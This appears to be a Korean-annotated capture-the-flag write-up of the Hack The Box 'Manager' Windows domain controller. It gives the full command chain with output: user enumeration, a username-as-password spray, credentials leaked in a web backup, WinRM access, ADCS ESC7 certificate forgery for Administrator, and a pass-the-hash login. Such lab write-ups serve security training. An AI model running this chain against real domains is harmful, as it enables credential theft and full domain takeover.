---
tags:
  - type/machine
  - platform/htb
  - os/windows
  - status/solved
  - tech/ad/adcs
  - tech/ad/dnsadmins
  - tech/db/mssql
  - tech/svc/smb
  - tech/exec/winrm
type: machine
platform: htb
os: windows
ip: 10.129.9.243
domain: manager.htb
ports: [53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 1433, 3268, 3269, 5985, 9389]
services: [domain, http, kerberos-sec, kpasswd5, ldap, mc-nmf, microsoft-ds, ms-sql-s, msrpc, ncacn_http, netbios-ssn, ssl/ldap]
status: solved
tech_count: 5
---
## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ nnmap 10.129.9.243                                              
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-16 18:41 +0900
Nmap scan report for 10.129.9.243
Host is up (0.23s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Manager
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-16 15:17:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-16T15:19:16+00:00; +5h35m14s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2026-03-16T15:19:16+00:00; +5h35m14s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.9.243:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-16T15:14:55
|_Not valid after:  2056-03-16T15:14:55
|_ssl-date: 2026-03-16T15:19:16+00:00; +5h35m14s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.9.243:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-16T15:19:16+00:00; +5h35m13s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2026-03-16T15:19:16+00:00; +5h35m14s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49729/tcp open  msrpc         Microsoft Windows RPC
49738/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 5h35m12s, deviation: 1s, median: 5h35m13s
| smb2-time: 
|   date: 2026-03-16T15:18:32
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   225.06 ms 10.10.14.1
2   225.39 ms 10.129.9.243

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.28 seconds

```

user명 출력
```bash
impacket-lookupsid qq@manager.htb -no-pass | grep SidTypeUser | cut -d' ' -f2 | cut -d'\' -f2 | tr '[:upper:]' '[:lower:]' | tee users
administrator
guest
krbtgt
dc01$
zhong
cheng
ryan
raven
jinwoo
chinhae
operator

```


nxc 사용하여 user명 브루트포스
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ nxc smb 10.129.9.243 -u guest -p '' --rid-brute                 
SMB         10.129.9.243    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.9.243    445    DC01             [+] manager.htb\guest: 
SMB         10.129.9.243    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                                                                                 
SMB         10.129.9.243    445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.129.9.243    445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.129.9.243    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.129.9.243    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.129.9.243    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.129.9.243    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.129.9.243    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.129.9.243    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.129.9.243    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.129.9.243    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.129.9.243    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.129.9.243    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.9.243    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.9.243    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.9.243    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.129.9.243    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.129.9.243    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.9.243    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.9.243    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)                                                                                                                 
SMB         10.129.9.243    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)                                                                                                                  
SMB         10.129.9.243    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.129.9.243    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.129.9.243    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.9.243    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.129.9.243    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.129.9.243    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.129.9.243    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.129.9.243    445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.129.9.243    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.129.9.243    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.129.9.243    445    DC01             1119: MANAGER\Operator (SidTypeUser)

```

기본 도메인 확인하기 위하여 ldapsearch  사용
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ ldapsearch -H ldap://dc01.manager.htb -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=manager,DC=htb
namingcontexts: CN=Configuration,DC=manager,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=manager,DC=htb
namingcontexts: DC=DomainDnsZones,DC=manager,DC=htb
namingcontexts: DC=ForestDnsZones,DC=manager,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```


kerbrute 무차별 대입
```bash
┌──(kali㉿kali)-[~/…/git/kerbrute/kerbrute/dist]
└─$ ./kerbrute_linux_amd64 userenum /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt --dc dc01.manager.htb -d manager.htb

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 03/16/26 - Ronnie Flathers @ropnop

2026/03/16 22:00:49 >  Using KDC(s):
2026/03/16 22:00:49 >   dc01.manager.htb:88

2026/03/16 22:00:50 >  [+] VALID USERNAME:       ADMINISTRATOR@manager.htb
2026/03/16 22:00:51 >  [+] VALID USERNAME:       Administrator@manager.htb
2026/03/16 22:00:53 >  [+] VALID USERNAME:       GUEST@manager.htb
2026/03/16 22:00:53 >  [+] VALID USERNAME:       Guest@manager.htb
2026/03/16 22:00:56 >  [+] VALID USERNAME:       OPERATOR@manager.htb
2026/03/16 22:00:56 >  [+] VALID USERNAME:       Operator@manager.htb
2026/03/16 22:01:01 >  [+] VALID USERNAME:       administrator@manager.htb
2026/03/16 22:01:03 >  [+] VALID USERNAME:       guest@manager.htb
2026/03/16 22:01:05 >  [+] VALID USERNAME:       operator@manager.htb
2026/03/16 22:01:09 >  Done! Tested 828 usernames (9 valid) in 19.454 seconds

```


비밀번호 조합 무차별 대입
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ netexec smb manager.htb -u users -p users --continue-on-success --no-brute
SMB         10.129.9.243    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.9.243    445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE
SMB         10.129.9.243    445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE 
SMB         10.129.9.243    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.129.9.243    445    DC01             [-] manager.htb\dc01$:dc01$ STATUS_LOGON_FAILURE 
SMB         10.129.9.243    445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE 
SMB         10.129.9.243    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
SMB         10.129.9.243    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
SMB         10.129.9.243    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
SMB         10.129.9.243    445    DC01             [-] manager.htb\jinwoo:jinwoo STATUS_LOGON_FAILURE 
SMB         10.129.9.243    445    DC01             [-] manager.htb\chinhae:chinhae STATUS_LOGON_FAILURE 
SMB         10.129.9.243    445    DC01             [+] manager.htb\operator:operator 



```

공유폴더 확인
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ netexec smb manager.htb -u operator -p operator --shares
SMB         10.129.9.243    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.9.243    445    DC01             [+] manager.htb\operator:operator 
SMB         10.129.9.243    445    DC01             [*] Enumerated shares
SMB         10.129.9.243    445    DC01             Share           Permissions     Remark
SMB         10.129.9.243    445    DC01             -----           -----------     ------
SMB         10.129.9.243    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.9.243    445    DC01             C$                              Default share
SMB         10.129.9.243    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.9.243    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.9.243    445    DC01             SYSVOL          READ            Logon server share 

```

ldap domain dump
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ ldapdomaindump -u management.htb\\operator -p 'operator' 10.129.9.243 -o ldap/
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ ls ldap                                                                       
domain_computers_by_os.html  domain_groups.grep  domain_policy.html  domain_trusts.json          domain_users.json
domain_computers.grep        domain_groups.html  domain_policy.json  domain_users_by_group.html
domain_computers.html        domain_groups.json  domain_trusts.grep  domain_users.grep
domain_computers.json        domain_policy.grep  domain_trusts.html  domain_users.html
                                                                                         
```


domain_users_by_group.html 결과
![[Pasted image 20260316210651.png]]

데이터베이스도 가능
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ netexec mssql manager.htb -u operator -p operator
MSSQL       10.129.9.243    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       10.129.9.243    1433   DC01             [+] manager.htb\operator:operator 


```

impacket-mssqlclient 사용하여 운영체제 인증하고 자격증명 여부 확인
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ impacket-mssqlclient -windows-auth manager.htb/operator:operator@manager.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> 

```

데이터베이스는 총 4개
```bash
SQL (MANAGER\Operator  guest@master)> select name from master..sysdatabases;
name     
------   
master   

tempdb   

model    

msdb     

```

xp_cmdshell 은 접근 권한이 없어서 활성화 불가
```bash
SQL (MANAGER\Operator  guest@master)> xp_cmdshell whoami
ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.

```

xp_dirtree 정상작동
```bash
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   

contact.html                          1      1   

css                                   1      0   

images                                1      0   

index.html                            1      1   

js                                    1      0   

service.html                          1      1   

web.config                            1      1   

website-backup-27-07-23-old.zip       1      1   

```

백업 아카이브 다운로드
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ wget http://manager.htb/website-backup-27-07-23-old.zip
--2026-03-16 22:26:16--  http://manager.htb/website-backup-27-07-23-old.zip
Resolving manager.htb (manager.htb)... 10.129.9.243
Connecting to manager.htb (manager.htb)|10.129.9.243|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1045328 (1021K) [application/x-zip-compressed]
Saving to: ‘website-backup-27-07-23-old.zip’

website-backup-27-07-23-old. 100%[==============================================>]   1021K   563KB/s    in 1.8s    

2026-03-16 22:26:18 (563 KB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]

```

압축해제
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ unzip website-backup-27-07-23-old.zip -d webbackup/
Archive:  website-backup-27-07-23-old.zip
  inflating: webbackup/.old-conf.xml  
  inflating: webbackup/about.html    
...
```

.old-conf.xml 접근
```bash
┌──(kali㉿kali)-[~/HTB/Manager/webbackup]
└─$ ls -al    
total 68
drwxrwxr-x 5 kali kali  4096 Mar 16 22:27 .
drwxrwxr-x 4 kali kali  4096 Mar 16 22:27 ..
-rw-rw-r-- 1 kali kali  5386 Jul 27  2023 about.html
-rw-rw-r-- 1 kali kali  5317 Jul 27  2023 contact.html
drwxrwxr-x 2 kali kali  4096 Mar 16 22:27 css
drwxrwxr-x 2 kali kali  4096 Mar 16 22:27 images
-rw-rw-r-- 1 kali kali 18203 Jul 27  2023 index.html
drwxrwxr-x 2 kali kali  4096 Mar 16 22:27 js
-rw-rw-r-- 1 kali kali   698 Jul 27  2023 .old-conf.xml
-rw-rw-r-- 1 kali kali  7900 Jul 27  2023 service.html


┌──(kali㉿kali)-[~/HTB/Manager/webbackup]
└─$ cat .old-conf.xml    
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>


```


winrm 접근
```bash

┌──(kali㉿kali)-[~/HTB/Manager/webbackup]
└─$ evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123' 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents> 


```

user.txt 획득

![[Pasted image 20260316213055.png]]

ADCS 확인
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ certipy-ad find -dc-ip 10.129.9.243 -ns 10.129.9.243 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'manager-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'manager-DC01-CA'
[*] Checking web enrollment for CA 'manager-DC01-CA' @ 'dc01.manager.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
    [+] User ACL Principals             : MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates

```


ESC7
인증서 추가 관리
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ certipy-ad ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: MANAGER.HTB.
[!] Use -debug to print a stacktrace
[*] Successfully added officer 'Raven' on 'manager-DC01-CA'

```

manageCertificates 에서 추가 확인 가능
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ certipy-ad find -dc-ip 10.129.9.243 -ns 10.129.9.243 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'manager-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'manager-DC01-CA'
[*] Checking web enrollment for CA 'manager-DC01-CA' @ 'dc01.manager.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
    [+] User Enrollable Principals      : MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
    [+] User ACL Principals             : MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates

```


Raven 계정에 certificate Officer 역할 추가
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ns '10.129.16.11' -target 'DC01.manager.htb' -ca 'manager-DC01-CA' -add-officer 'raven'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.402 seconds: Server Do53:10.129.16.11@53 answered The DNS operation timed out.; Server Do53:10.129.16.11@53 answered The DNS operation timed out.; Server Do53:10.129.16.11@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The resolution lifetime expired after 5.402 seconds: Server Do53:10.129.16.11@53 answered The DNS operation timed out.; Server Do53:10.129.16.11@53 answered The DNS operation timed out.; Server Do53:10.129.16.11@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Successfully added officer 'Raven' on 'manager-DC01-CA'

┌──(kali㉿kali)-[~/HTB/Manager]
└─$ certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ns '10.129.9.243' -target 'DC01.manager.htb' -ca 'manager-DC01-CA' -add-officer 'raven'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'


```

CA에서 SubCA템플릿을 활성화하여 사용 가능하도록 설정
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ns '10.129.9.243' -target 'DC01.manager.htb' -ca 'manager-DC01-CA' -enable-template 'SubCA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'

```

Administrator 계정으로 SubCA 템플릿 인증서를 요청하여 Request ID 23와 private key 생성
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ certipy-ad req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.9.243  -target 'DC01.manager.htb' -ca 'manager-DC01-CA' -template 'SubCA' -upn 'administrator@manager.htb' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 22
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '22.key'
[*] Wrote private key to '22.key'
[-] Failed to request certificate


```

Raven의 ManageCa 및 Officer 권한을 이용해 대기 중인 Request ID 23를 강제로 승인
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ns 10.129.9.243  -target 'DC01.manager.htb' -ca 'manager-DC01-CA' -issue-request '23' -dc-ip 10.129.9.243
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate request ID 23

```

승인된 Request ID 23의 인증서와 private key와 사용하여 administrator.pfx 파일 생성
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ certipy-ad req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip '10.129.9.243' -target 'DC01.manager.htb' -ca 'manager-DC01-CA' -retrieve '23'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Retrieving certificate with ID 23
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Loaded private key from '23.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```




PFX 인증서를 이용해 Kerberos TGT를 획득하고 Administrator의 NT 해시를 덤프
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'manager.htb' -dc-ip '10.129.9.243'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@manager.htb'
[*]     SAN URL SID: 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*]     Security Extension SID: 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Using principal: 'administrator@manager.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef

```


추출한 NT 해시로 WinRM을 통해 Administrator로 로그인 성공
```bash
┌──(kali㉿kali)-[~/HTB/Manager]
└─$ evil-winrm -i 10.129.9.243 -u 'administrator' -H 'ae5064c2f62317332c88629e025924ef'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 


```

root.txt 획득
![[Pasted image 20260316215109.png]]